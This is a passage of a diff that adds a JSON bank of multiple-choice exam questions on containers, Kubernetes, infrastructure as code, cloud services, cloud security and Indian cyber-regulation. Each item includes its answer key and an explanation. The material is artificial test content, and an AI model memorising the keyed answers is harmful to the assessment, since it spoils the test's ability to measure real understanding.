+   "D": "type: LoadBalancer with externalTrafficPolicy: Local"
+  },
+  "ans": "A",
+  "conf": "high",
+  "exp": "A headless Service is allocated no virtual IP, so the cluster DNS server answers the Service name with one address record per ready endpoint — the mechanism StatefulSet members use to find their peers directly. ExternalName is the other DNS-special Service type but it returns a CNAME to a name outside the cluster and has no endpoints at all.",
+  "id": "GEN-T2U4-037"
+ },
+ {
+  "unit": "4",
+  "slug": "U4-L05",
+  "sub": "Containers, Docker, Kubernetes orchestration, Infrastructure as Code and DevOps",
+  "q": "A container's readiness probe starts failing while its liveness probe keeps succeeding. What does Kubernetes do?",
+  "opts": {
+   "A": "The kubelet restarts the container once the readiness probe's failureThreshold is reached",
+   "B": "The Pod is evicted and rescheduled onto a different node",
+   "C": "Nothing changes for that Pod until the liveness probe also begins to fail",
+   "D": "The Pod's address is removed from the Service's endpoints, but the container is left running"
+  },
+  "ans": "D",
+  "conf": "high",
+  "exp": "Readiness controls endpoint membership only: a Pod that reports not-ready is dropped from the Service's endpoints so it stops receiving traffic, while its container continues to run untouched. Restarting a container is strictly the liveness probe's job, which is why C is wrong — the Pod's traffic does change immediately, even though nothing restarts.",
+  "id": "GEN-T2U4-038"
+ },
+ {
+  "unit": "4",
+  "slug": "U4-L05",
+  "sub": "Containers, Docker, Kubernetes orchestration, Infrastructure as Code and DevOps",
+  "q": "A Dockerfile contains:\n\nFROM debian:stable-slim\nRUN apt-get update && apt-get install -y gcc\nRUN rm -rf /var/lib/apt/lists/*\nCOPY ./src /src\n\nThe image is built normally, with no multi-stage build and no squashing. What is the effect of the third instruction on the size of the resulting image?",
+  "opts": {
+   "A": "The image shrinks by roughly the size of the deleted package lists",
+   "B": "The image does not shrink; the files stay in the earlier layer and the new layer only records their deletion",
+   "C": "The build fails, because a RUN instruction cannot delete files created by a previous RUN instruction",
+   "D": "The image shrinks only because the deletion happens before the final COPY instruction"
+  },
+  "ans": "B",
+  "conf": "high",
+  "exp": "Image layers are additive and immutable: deleting a file in a later layer writes a whiteout entry that hides it from the assembled filesystem, but the earlier layer still ships the bytes, so the sum of the layers is unchanged. To actually reclaim the space the cleanup must run inside the same RUN instruction that created the files, or the wanted artefacts must be copied into a fresh stage.",
+  "id": "GEN-T2U4-039"
+ },
+ {
+  "unit": "4",
+  "slug": "U4-L05",
+  "sub": "Containers, Docker, Kubernetes orchestration, Infrastructure as Code and DevOps",
+  "q": "With default options, what does `terraform plan` compare in order to produce the diff it prints?",
+  "opts": {
+   "A": "The configuration against state that has first been refreshed from the providers' real remote objects, making no changes of its own",
+   "B": "The configuration against the state file exactly as stored, without contacting any provider API",
+   "C": "The current configuration against the previous revision of the configuration in version control",
+   "D": "The state file against the dependency lock file that pins provider versions"
+  },
+  "ans": "A",
+  "conf": "high",
+  "exp": "By default a plan reads the real objects back from the provider APIs, updates its in-memory view of state, and only then diffs that against the configuration to propose create/update/destroy actions without performing them. Trusting the stored state alone (B) is what `-refresh=false` does, and it makes the plan blind to out-of-band drift — the very thing a plan is expected to surface.",
+  "id": "GEN-T2U4-040"
+ },
+ {
+  "unit": "4",
+  "slug": "U4-L05",
+  "sub": "Containers, Docker, Kubernetes orchestration, Infrastructure as Code and DevOps",
+  "q": "An Ansible playbook task that invokes a shell command reports `changed` on every single run, even when the target host is already in the desired state. What explains this?",
+  "opts": {
+   "A": "Fact gathering has been disabled for the play, so Ansible has nothing to compare the host against",
+   "B": "The task is missing `become: true`, so its result is reported but never actually committed",
+   "C": "The command and shell modules cannot inspect prior state, so Ansible reports changed unless the task is guarded with `creates`, `removes` or a `changed_when` condition",
+   "D": "Ansible is agentless, so idempotent reporting requires an agent-based tool such as Puppet"
+  },
+  "ans": "C",
+  "conf": "high",
+  "exp": "Idempotent status in Ansible comes from modules that inspect the current state and report `ok` when there was nothing to do; command and shell just execute an opaque process whose effect Ansible cannot reason about, so they report `changed` unconditionally unless bounded by `creates`, `removes` or `changed_when`. Agentlessness (D) is irrelevant — `apt`, `file` and `copy` are equally agentless and still report `ok` correctly.",
+  "id": "GEN-T2U4-041"
+ },
+ {
+  "unit": "4",
+  "slug": "U4-L05",
+  "sub": "Containers, Docker, Kubernetes orchestration, Infrastructure as Code and DevOps",
+  "q": "A CI/CD pipeline builds a versioned artefact once and then promotes that identical artefact through test, staging and production, rather than rebuilding it from source at each stage. Which risk does this practice principally remove?",
+  "opts": {
+   "A": "Build-time secrets being baked into the image and readable by anyone who pulls it",
+   "B": "The binary that passed testing differing from the binary that reaches production, because a later rebuild resolved different dependencies or used a different toolchain",
+   "C": "Drift between the recorded Terraform state and the real infrastructure",
+   "D": "A container process escaping its namespaces onto the host"
+  },
+  "ans": "B",
+  "conf": "high",
+  "exp": "A rebuild is not guaranteed to be bit-identical — a floating dependency version, a moved base-image tag or a different build agent can quietly yield a different binary from the one the tests approved. Promoting a single immutable artefact makes \"tested\" and \"deployed\" the same object, with per-environment differences injected as configuration at deploy time instead.",
+  "id": "GEN-T2U4-042"
+ },
+ {
+  "unit": "4",
+  "slug": "U4-L05",
+  "sub": "Containers, Docker, Kubernetes orchestration, Infrastructure as Code and DevOps",
+  "q": "Kubernetes removed the in-tree Docker shim from the kubelet some releases ago. Which interface does the kubelet use to create and manage containers on a node?",
+  "opts": {
+   "A": "The Open Container Initiative runtime specification, as implemented by runc",
+   "B": "The Container Network Interface (CNI)",
+   "C": "libcontainer, linked directly into the kubelet binary",
+   "D": "The Container Runtime Interface (CRI), a gRPC API implemented by runtimes such as containerd and CRI-O"
+  },
+  "ans": "D",
+  "conf": "high",
+  "exp": "CRI is the gRPC contract between the kubelet and whatever container runtime a node runs; dropping dockershim only meant Docker Engine lost its special in-tree adapter to that contract. The OCI runtime specification (A) is real but sits a level lower — it is how a high-level runtime like containerd asks runc to start the process, not something the kubelet speaks.",
+  "id": "GEN-T2U4-043"
+ },
+ {
+  "unit": "4",
+  "slug": "U4-L05",
+  "sub": "Containers, Docker, Kubernetes orchestration, Infrastructure as Code and DevOps",
+  "q": "A HorizontalPodAutoscaler raises a Deployment from 4 to 10 replicas under load. The six new Pods stay `Pending`, and `kubectl describe pod` reports `0/3 nodes are available: 3 Insufficient cpu`. What is happening?",
+  "opts": {
+   "A": "No node has enough unreserved allocatable CPU left to satisfy the new Pods' CPU requests, and nothing will add capacity unless a cluster autoscaler is running",
+   "B": "The HPA's maxReplicas has been reached, so the scheduler is refusing to admit the surplus Pods",
+   "C": "The new Pods have exceeded their CPU limits and are being throttled into the Pending state",
+   "D": "The Deployment's rolling update strategy is holding the new Pods back until the original four terminate"
+  },
+  "ans": "A",
+  "conf": "high",
+  "exp": "An HPA only edits the replica count; the scheduler still has to find a node whose unreserved allocatable CPU covers each Pod's CPU request, and Kubernetes never adds machines on its own without a cluster autoscaler. Exceeding a CPU limit (C) throttles an already-running container and can never put a Pod into Pending, which is a pre-scheduling state.",
+  "id": "GEN-T2U4-044"
+ },
+ {
+  "unit": "4",
+  "slug": "U4-L06",
+  "sub": "Cloud storage, compute, networking, managed databases, monitoring and multi-cloud",
+  "q": "An application writes about five million log objects a day to a cloud object store; each object is roughly 20 KB and is deleted about 30 days after it is written. To cut cost the team adds a lifecycle rule that transitions every object to the provider's archive storage class 7 days after creation. The monthly bill rises instead of falling. What best explains this?",
+  "opts": {
+   "A": "Archive classes are held in a single availability zone, and single-zone storage carries a durability surcharge that outweighs the lower per-GB rate",
+   "B": "The lifecycle rule copies each object into the archive class but leaves the original in the standard class until it is deleted explicitly, so every object is billed in both classes",
+   "C": "Archive classes bill each object for a minimum storage duration and against a minimum billable object size, and each transition is itself a chargeable request — so small, short-lived objects cost more there than in the standard class",
+   "D": "Objects are re-encrypted with provider-managed keys on transition, and key operations are then billed per object per month"
+  },
+  "ans": "C",
+  "conf": "high",
+  "exp": "Cold and archive classes price against a minimum billable object size and a minimum storage duration, and charge a per-object request for the transition itself; 20 KB objects deleted at 30 days trip all three at once. B is the tempting misreading — a lifecycle transition changes an object's storage class in place and does not leave a second billable copy behind.",
+  "id": "GEN-T2U4-045"
+ },
+ {
+  "unit": "4",
+  "slug": "U4-L06",
+  "sub": "Cloud storage, compute, networking, managed databases, monitoring and multi-cloud",
+  "q": "On AWS, an EC2 instance in a public subnet serves HTTPS. Its security group allows inbound TCP 443 from 0.0.0.0/0 and all outbound traffic. The subnet's network ACL allows inbound TCP 443 from 0.0.0.0/0, but its outbound entries allow only TCP 443. Clients get no response at all and eventually time out. What explains it?",
+  "opts": {
+   "A": "Security groups are evaluated only on traffic crossing the VPC boundary, so the inbound 443 rule never applies to traffic arriving via the internet gateway",
+   "B": "Network ACLs are stateless, so the server's replies — which leave from port 443 towards the client's ephemeral port — need their own outbound entry covering the ephemeral port range; the security group is stateful and needs no matching rule",
+   "C": "Security groups evaluate their rules in numbered order and stop at the first match, so the allow-all outbound rule is shadowed by the inbound 443 rule",
+   "D": "A network ACL governs only traffic between subnets of the same VPC, so it cannot affect traffic destined for an internet client"
+  },
+  "ans": "B",
+  "conf": "high",
+  "exp": "A network ACL evaluates inbound and outbound entries independently with no connection state, so the response packet is a fresh outbound flow to the client's ephemeral port and is denied by the implicit deny. The security group is not at fault precisely because it is stateful: return traffic for an allowed inbound flow is permitted automatically, which is the whole difference between the two controls.",
+  "id": "GEN-T2U4-046"
+ },
+ {
+  "unit": "4",
+  "slug": "U4-L06",
+  "sub": "Cloud storage, compute, networking, managed databases, monitoring and multi-cloud",
+  "q": "An enterprise replaces its site-to-cloud IPsec VPN over the public internet with a dedicated private interconnect to the provider (for example AWS Direct Connect or Azure ExpressRoute). Which statement about the change is correct?",
+  "opts": {
+   "A": "The interconnect performs address translation between on-premises and cloud address space, so overlapping private IP ranges cease to be a problem",
+   "B": "The interconnect is encrypted end to end by the provider at line rate, making any tunnel running over it redundant",
+   "C": "The interconnect removes the need for BGP or any other routing exchange, because on-premises routes are learned from the provider's DHCP service",
+   "D": "The interconnect gives more predictable bandwidth and latency by bypassing the public internet, but carries traffic unencrypted by default — confidentiality must still be added on top, for example with IPsec or MACsec"
+  },
+  "ans": "D",
+  "conf": "high",
+  "exp": "A dedicated interconnect is a private path, not a cryptographic one: it buys deterministic throughput and latency and keeps traffic off the public internet, but it applies no confidentiality of its own. B is the usual and dangerous misconception — 'private circuit' gets read as 'encrypted circuit', and for a regulated workload that assumption is exactly where the exposure sits.",
+  "id": "GEN-T2U4-047"
+ },
+ {
+  "unit": "4",
+  "slug": "U4-L06",
+  "sub": "Cloud storage, compute, networking, managed databases, monitoring and multi-cloud",
+  "q": "An application uses Amazon RDS for PostgreSQL in a Multi-AZ instance deployment (one standby) with two read replicas, and routes all read queries to the replicas. A user saves a profile change and the very next page load shows the old value. Which explains the behaviour?",
+  "opts": {
+   "A": "Read replicas are kept current by asynchronous replication, so a replica can lag the primary and a just-committed write is not guaranteed to be visible there yet",
+   "B": "Read replicas serve from the most recent automated snapshot, which is taken on a fixed schedule rather than continuously",
+   "C": "Read replicas run at a lower transaction isolation level than the primary, so they cannot see committed rows until their next checkpoint",
+   "D": "The Multi-AZ standby answered the read; standbys replicate synchronously but expose their data only once a failover has completed"
+  },
+  "ans": "A",
+  "conf": "high",
+  "exp": "RDS read replicas are maintained by asynchronous streaming replication, so replica lag is normal operation and read-your-own-writes holds only if that read goes to the primary or the application waits for the replica to catch up. D is the plausible trap, but the standby in a Multi-AZ instance deployment serves no query traffic at all — it exists solely for failover, so it cannot have answered anything.",
+  "id": "GEN-T2U4-048"
+ },
+ {
+  "unit": "4",
+  "slug": "U4-L06",
+  "sub": "Cloud storage, compute, networking, managed databases, monitoring and multi-cloud",
+  "q": "A serverless function backing a public API scales out to several hundred concurrent executions, each opening its own connection to a managed PostgreSQL instance. The database begins refusing connections once its configured limit is reached, and simply raising that limit starves the instance of memory. Which remedy addresses the cause?",
+  "opts": {
+   "A": "Move the connection open and close inside the request handler so that each connection is released before the invocation returns",
+   "B": "Lower the database's transaction isolation level so that transactions release their connections sooner",
+   "C": "Place a connection pooler or managed database proxy between the functions and the database, so that many short-lived client connections are multiplexed onto a small, stable pool of backend connections",
+   "D": "Add read replicas and route all traffic to them; the connection limit is enforced cluster-wide, so additional replicas raise the total available"
+  },
+  "ans": "C",
+  "conf": "high",
+  "exp": "Each execution environment holds its own connection, so it is peak concurrency rather than per-invocation lifetime that sets the connection count, and a pooler such as PgBouncer or a managed proxy is what decouples the two. A is the intuitive fix and is wrong: opening and closing inside the handler leaves the peak unchanged and merely adds a TLS and authentication handshake to every request.",
+  "id": "GEN-T2U4-049"
+ },
+ {
+  "unit": "4",
+  "slug": "U4-L06",
+  "sub": "Cloud storage, compute, networking, managed databases, monitoring and multi-cloud",
+  "q": "A team adds the end user's account ID as a label on a request-count metric in a Prometheus-style metrics system. Within days, ingestion memory and query latency degrade sharply. What is the mechanism?",
+  "opts": {
+   "A": "Every distinct combination of label values defines a separate time series, so an unbounded label such as a user ID multiplies the number of stored series by the size of the user base",
+   "B": "Label values are held in a full-text index, so the cost is driven by the character length of each value rather than by how many distinct values occur",
+   "C": "Adding a label raises the effective scrape resolution for that metric, so more samples are collected per unit of time",
+   "D": "The cost comes from the number of label keys attached to a metric rather than from their values — each extra key multiplies storage by a fixed factor whatever values it takes"
+  },
+  "ans": "A",
+  "conf": "high",
+  "exp": "Cardinality is the product of the distinct values of every label, and each combination becomes an independently stored and indexed time series, so a user ID grows the series count without bound. D states the common inversion — it is the distinct values, not the count of label keys, that drives cost, and this is why per-user detail belongs in logs or traces rather than in metric labels.",
+  "id": "GEN-T2U4-050"
+ },
+ {
+  "unit": "4",
+  "slug": "U4-L06",
+  "sub": "Cloud storage, compute, networking, managed databases, monitoring and multi-cloud",
+  "q": "Which statement best captures the distinction usually drawn between monitoring and observability?",
+  "opts": {
+   "A": "Monitoring is agent-based collection while observability is agentless collection; the signals gathered are otherwise the same",
+   "B": "Monitoring covers infrastructure such as hosts and networks, while observability covers application code only",
+   "C": "Monitoring is what a cloud provider performs on its own platform; observability is what a customer performs on the workloads it runs there",
+   "D": "Monitoring watches predefined signals and alerts on failure modes anticipated in advance, whereas observability is the property of a system whose external outputs are rich enough to answer new, unanticipated questions about its internal state without shipping fresh instrumentation"
+  },
+  "ans": "D",
+  "conf": "high",
+  "exp": "The working distinction is about which questions can be asked: monitoring answers the ones chosen before the incident, while observability is the property that lets a system be interrogated after it behaves in a way nobody predicted, using telemetry it already emits. A, B and C describe collection mechanics or ownership boundaries — an agent-based pipeline over infrastructure metrics can be highly observable, so none of them is the accepted distinction.",
+  "id": "GEN-T2U4-051"
+ },
+ {
+  "unit": "4",
+  "slug": "U4-L06",
+  "sub": "Cloud storage, compute, networking, managed databases, monitoring and multi-cloud",
+  "q": "An OpenStack tenant needs storage that survives termination of the instance it is attached to, presents to the guest as a raw block device which the guest formats itself, and is attached to one Nova instance at a time. Which OpenStack service provides it?",
+  "opts": {
+   "A": "Swift",
+   "B": "Cinder",
+   "C": "Manila",
+   "D": "Glance"
+  },
+  "ans": "B",
+  "conf": "high",
+  "exp": "Cinder is OpenStack's block storage service: it provisions volumes that Nova attaches as block devices and whose lifecycle is independent of the instance. Manila is the closest trap because it is a genuine OpenStack storage service, but it serves shared file systems over protocols such as NFS or CIFS rather than raw block devices; Swift is object storage reached over HTTP, and Glance catalogues VM images.",
+  "id": "GEN-T2U4-052"
+ },
+ {
+  "unit": "4",
+  "slug": "U4-L06",
+  "sub": "Cloud storage, compute, networking, managed databases, monitoring and multi-cloud",
+  "q": "A 40-hour distributed GPU training job is placed on discounted preemptible (spot) capacity to reduce cost. Nodes are reclaimed every few hours with roughly two minutes' warning, and each reclamation loses all progress made since the job started. Which change lets the job keep using preemptible capacity?",
+  "opts": {
+   "A": "Checkpoint model weights and optimizer state to durable shared storage at regular intervals and on receipt of the preemption notice, and have the job resume from the latest checkpoint when it restarts",
+   "B": "Enable gradient accumulation, so that the partial gradients built up on a node survive its termination and are merged when the job restarts",
+   "C": "Stage the training dataset on each node's local NVMe disk, so that a reclaimed node loses no training progress",
+   "D": "Collapse the job into a single process with a proportionally larger batch size, so that there is no distributed state for a reclamation to lose"
+  },
+  "ans": "A",
+  "conf": "high",
+  "exp": "Preemptible capacity is a durability problem rather than a throughput one, so the defence is periodic checkpointing of weights and optimizer state to storage outside the node, together with a signal handler that flushes on the termination notice so a restart resumes instead of starting over. B misreads gradient accumulation: it accumulates across micro-batches within a single optimizer step, entirely in GPU memory, and dies with the process.",
+  "id": "GEN-T2U4-053"
+ },
+ {
+  "unit": "4",
+  "slug": "U4-L07",
+  "sub": "Cloud security and governance: shared responsibility, IAM, Zero Trust, DevSecOps, FinOps and SLAs",
+  "q": "A department migrates a PostgreSQL database from a self-managed installation on IaaS virtual machines to the cloud provider's managed database service (PaaS). Under the shared responsibility model, which responsibility moves from the department to the provider as a result of that migration?",
+  "opts": {
+   "A": "Deciding which application accounts hold write privileges on each schema",
+   "B": "Classifying which columns hold personal data and setting how long those rows are retained",
+   "C": "Applying security patches to the database engine binaries and to the operating system beneath them",
+   "D": "Choosing the backup retention window and verifying that a restore actually reconstitutes the database"
+  },
+  "ans": "C",
+  "exp": "Moving up the service models transfers the layers below the abstraction being sold, so with a managed database the provider owns the host OS and engine patching that the department itself performed on IaaS. Backup retention is the tempting miss: a managed service runs the backup job for you, but how long copies are kept and whether restores are rehearsed remain customer decisions, as do data classification and privilege grants, which never transfer in any service model.",
+  "conf": "high",
+  "id": "GEN-T2U4-054"
+ },
+ {
+  "unit": "4",
+  "slug": "U4-L07",
+  "sub": "Cloud security and governance: shared responsibility, IAM, Zero Trust, DevSecOps, FinOps and SLAs",
+  "q": "An internal payroll API accepts any request arriving from the corporate VPN address range, on the reasoning that only authenticated employees can reach that range. Which change most directly addresses the assumption that Zero Trust rejects?",
+  "opts": {
+   "A": "Place the API on a dedicated VLAN routed only from payroll workstations",
+   "B": "Require multi-factor authentication at the point where the user logs in to the VPN",
+   "C": "Enforce mutual TLS between the VPN concentrator and the API so the transport is encrypted and the concentrator is authenticated",
+   "D": "Authenticate and authorise every individual request against a verified user or workload identity, irrespective of the network the request arrives from"
+  },
+  "ans": "D",
+  "exp": "Zero Trust's defining move is to stop treating network location as evidence of trustworthiness and to evaluate identity, device posture and authorisation per request. Strengthening the VPN login with MFA is the most tempting answer and is a real improvement, but it only hardens the perimeter and still grants everything behind it implicit trust once a session exists; segmentation and mutual TLS likewise relocate or encrypt the implicit trust rather than removing it.",
+  "conf": "high",
+  "id": "GEN-T2U4-055"
+ },
+ {
+  "unit": "4",
+  "slug": "U4-L07",
+  "sub": "Cloud security and governance: shared responsibility, IAM, Zero Trust, DevSecOps, FinOps and SLAs",
+  "q": "An application running on a cloud virtual machine must call the provider's object storage API. The requirement is that no long-lived credential exists anywhere — not on the host, not in the image, not in the source tree. Which approach satisfies that?",
+  "opts": {
+   "A": "Create an IAM user with an access key pair and inject it through an environment variable when the process starts",
+   "B": "Attach a cloud IAM role (managed identity) to the instance so the platform issues short-lived, automatically rotated credentials to the workload",
+   "C": "Store an access key pair in the provider's secrets manager and have the application fetch it over TLS at startup",
+   "D": "Bake the access key pair into the machine image and restrict which accounts may launch that image"
+  },
+  "ans": "B",
+  "exp": "An instance role makes the platform itself the credential issuer: the workload receives temporary, scoped, auto-rotating credentials from the instance metadata service, so there is no static secret to leak or rotate. The secrets manager option is the trap — it is genuinely better than an environment variable or a baked-in image because it centralises and audits access, but the key pair it holds is still long-lived, which is exactly what the requirement forbids.",
+  "conf": "high",
+  "id": "GEN-T2U4-056"
+ },
+ {
+  "unit": "4",
+  "slug": "U4-L07",
+  "sub": "Cloud security and governance: shared responsibility, IAM, Zero Trust, DevSecOps, FinOps and SLAs",
+  "q": "A cloud admin console is protected by multi-factor authentication. In an adversary-in-the-middle phishing campaign, a look-alike site relays the victim's password and second factor to the real console in real time and steals the resulting session. Which second factor would have defeated that attack by design?",
+  "opts": {
+   "A": "A FIDO2/WebAuthn security key or platform authenticator",
+   "B": "A time-based one-time password from an authenticator app",
+   "C": "A six-digit one-time code delivered by SMS",
+   "D": "A push notification that the user approves in the provider's mobile app"
+  },
+  "ans": "A",
+  "exp": "A WebAuthn assertion is signed over the origin the browser is actually connected to and is bound to that relying party, so a proxy sitting on a look-alike domain cannot obtain a signature the real console will accept. The other three all produce a bearer value or a yes/no decision that carries no binding to the site being visited, which is precisely what lets a real-time relay forward it — the push option is the most tempting because it looks 'modern', but an approval prompt still approves the attacker's session.",
+  "conf": "high",
+  "id": "GEN-T2U4-057"
+ },
+ {
+  "unit": "4",
+  "slug": "U4-L07",
+  "sub": "Cloud security and governance: shared responsibility, IAM, Zero Trust, DevSecOps, FinOps and SLAs",
+  "q": "A disaster recovery plan for a citizen-facing service states RPO 15 minutes and RTO 4 hours. The current design ships a full database snapshot to a second region every 6 hours, and a rehearsed failover brings the service back from the latest snapshot in about 90 minutes. What does the rehearsal establish?",
+  "opts": {
+   "A": "Both objectives are met, since the failover completes well inside 4 hours",
+   "B": "The RPO is met but the RTO is not, so a warm standby is needed to shorten the recovery",
+   "C": "The RTO is met but the RPO is not, so continuous replication or transaction-log shipping is needed to close the gap",
+   "D": "Neither objective is met, because a snapshot-based design cannot satisfy either target"
+  },
+  "ans": "C",
+  "exp": "RTO is how long the service may stay down and RPO is how much data may be lost, so the 90-minute recovery comfortably clears the 4-hour RTO while a 6-hour snapshot interval can lose up to 6 hours of writes against a 15-minute RPO. Option B inverts the two definitions, which is the standard confusion: shortening restore time does nothing about data loss, and only increasing replication frequency moves the RPO.",
+  "conf": "high",
+  "id": "GEN-T2U4-058"
+ },
+ {
+  "unit": "4",
+  "slug": "U4-L07",
+  "sub": "Cloud security and governance: shared responsibility, IAM, Zero Trust, DevSecOps, FinOps and SLAs",
+  "q": "An object storage service uses envelope encryption: each object is encrypted with its own data encryption key (DEK), and that DEK is stored alongside the object in wrapped form, encrypted under a customer-managed key held in the cloud KMS. The department disables the customer-managed key. What is the immediate effect on objects already stored?",
+  "opts": {
+   "A": "Nothing changes for stored objects; disabling the key only prevents new objects from being written",
+   "B": "The provider transparently re-wraps the existing DEKs under a platform-managed key so that reads continue",
+   "C": "Every stored object is re-encrypted in place under a freshly generated key before the disable takes effect",
+   "D": "The objects become unreadable, because the wrapped DEK can no longer be unwrapped even though the ciphertext itself is untouched"
+  },
+  "ans": "D",
+  "exp": "In envelope encryption the KMS key never leaves the KMS and is used only to unwrap the DEK on each read, so removing the ability to use it breaks every read that depends on it — this is the basis of crypto-shredding as a data-destruction control. Option A is the common misreading: the key gates decryption as well as encryption, so existing data is affected immediately, and no provider silently substitutes its own key to keep reads working, since that would defeat the point of customer-managed keys.",
+  "conf": "high",
+  "id": "GEN-T2U4-059"
+ },
+ {
+  "unit": "4",
+  "slug": "U4-L07",
+  "sub": "Cloud security and governance: shared responsibility, IAM, Zero Trust, DevSecOps, FinOps and SLAs",
+  "q": "A DevSecOps pipeline already runs static analysis over the team's own source, unit tests, and a dynamic scan against the deployed staging URL. A critical vulnerability still reaches production, in a transitive library pulled in by one of the declared dependencies. Which pipeline control was missing?",
+  "opts": {
+   "A": "An authenticated dynamic scan, so that endpoints behind login are also exercised",
+   "B": "Software composition analysis that resolves the full dependency tree and matches every resolved component against a vulnerability database",
+   "C": "Static analysis with a wider rule set and inter-procedural taint tracking",
+   "D": "Secret scanning across the repository history to catch committed credentials"
+  },
+  "ans": "B",
+  "exp": "Composition analysis is the only one of these that inspects code the team did not write: it resolves transitive dependencies, typically emits an SBOM, and matches each component and version against known advisories. Widening the static analysis rules is the tempting answer but static analysis is pointed at first-party source and would not flag a flaw sitting inside a third-party package that the build merely pulls in.",
+  "conf": "high",
+  "id": "GEN-T2U4-060"
+ },
+ {
+  "unit": "4",
+  "slug": "U4-L07",
+  "sub": "Cloud security and governance: shared responsibility, IAM, Zero Trust, DevSecOps, FinOps and SLAs",
+  "q": "Under the CERT-In directions issued in April 2022, which apply to service providers, intermediaries, data centres and body corporates in India, within what period of noticing a specified cyber security incident, or of it being brought to notice, must the incident be reported to CERT-In?",
+  "opts": {
+   "A": "6 hours",
+   "B": "24 hours",
+   "C": "72 hours",
+   "D": "7 days"
+  },
+  "ans": "A",
+  "exp": "The 2022 directions set a 6-hour reporting window for the listed categories of incident, alongside the requirement to keep ICT system logs for 180 days within Indian jurisdiction and to synchronise system clocks to NIC or NPL time servers. The 72-hour option is the one candidates reach for because it is the breach-notification deadline familiar from the EU GDPR, which has no bearing on the CERT-In obligation.",
+  "conf": "high",
+  "id": "GEN-T2U4-061"
+ },
+ {
+  "unit": "4",
+  "slug": "U4-L07",
+  "sub": "Cloud security and governance: shared responsibility, IAM, Zero Trust, DevSecOps, FinOps and SLAs",
+  "q": "A state department stores citizens' personal data on a MeitY-empanelled cloud service provider's infrastructure, and the provider processes that data only on the department's documented instructions under a contract. Under the Digital Personal Data Protection Act, 2023, which statement about accountability is correct?",
+  "opts": {
+   "A": "MeitY empanelment transfers statutory responsibility for the personal data to the provider for the empanelled workloads",
+   "B": "The provider becomes a joint Data Fiduciary, because the data physically resides on infrastructure it owns and operates",
+   "C": "The department remains the accountable Data Fiduciary; the provider is a Data Processor engaged under contract, and outsourcing the processing does not shift the Fiduciary's obligations",
+   "D": "The obligations attach to whoever operates the infrastructure, since that party determines how the processing is actually carried out"
+  },
+  "ans": "C",
+  "exp": "The Act keys the role to who determines the purpose and means of processing, so a department that instructs a provider is the Data Fiduciary and stays answerable for compliance even where a Data Processor performs the work on its behalf. Empanelment is the trap: MeitY empanelment is a procurement and assurance mechanism that tells a government buyer a provider has been assessed against defined requirements, and it confers no statutory transfer of accountability.",
+  "conf": "high",
+  "id": "GEN-T2U4-062"
+ }
+]
